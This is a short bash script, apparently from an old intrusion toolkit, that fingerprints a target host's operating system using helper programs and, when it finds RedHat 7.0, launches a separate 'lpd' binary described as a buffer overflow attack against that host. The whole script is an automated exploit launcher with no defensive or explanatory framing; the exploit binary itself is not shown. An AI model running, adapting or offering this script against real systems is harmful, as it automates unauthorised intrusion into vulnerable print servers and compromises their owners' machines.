#!/bin/bash
if [ "$1" = "" ]; then
echo "Check ../r00t f0r info"
exit
fi
#cd lpd
./fp $1 > temp.fp
V1="`cat temp.fp | grep $1 | cut -d " " -f 2`"
V2="`cat temp.fp | grep $1 | cut -d " " -f 4`"
OS="$V1 $V2"
echo -en "OS Version: "
if [  "$OS" = " " ];then
	./bscan $1 > temp.fp
	OS="`cat temp.fp | grep 7.0`"
        if [  "$OS" = "" ];then
		OS="Unknown"
	else
		OS="RedHat 7.0"
	fi
fi

echo "$OS..."
if [ "$OS" = "RedHat 7.0" ]; then
	echo "RedHat 7.0 found - tryin to buffer overflow"
	./lpd $1
fi

